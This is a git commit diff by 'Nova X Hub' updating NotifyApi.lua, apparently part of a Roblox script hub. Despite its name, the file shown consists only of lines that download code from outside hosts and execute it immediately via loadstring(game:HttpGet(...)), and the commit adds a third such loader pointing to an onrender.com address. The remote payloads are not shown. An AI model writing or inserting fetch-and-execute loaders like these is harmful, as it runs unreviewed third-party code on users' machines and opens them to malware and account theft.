36f88d8dd5f40af9dab93d68968acb50a0ab10ea
Nova X Hub <thunganyeudau1111@gmail.com>
2026-07-10 12:37:32 +0700

    Update NotifyApi.lua

--- NotifyApi.lua
+++ NotifyApi.lua
@@ -3,3 +3,5 @@ getgenv().script_id = "BYRyNclyy9PJ"
 loadstring(game:HttpGet("https://protectscripts.vercel.app/skid.txt"))()
 -- web trieu
 loadstring(game:HttpGet("https://xhider.xyz/raw/Xhider/Bot2/y9w6f8el66.txt"))()
+-- exe total
+loadstring(game:HttpGet("https://shopaccnqp.onrender.com/api/upload/cnpnqrnt/raw"))()
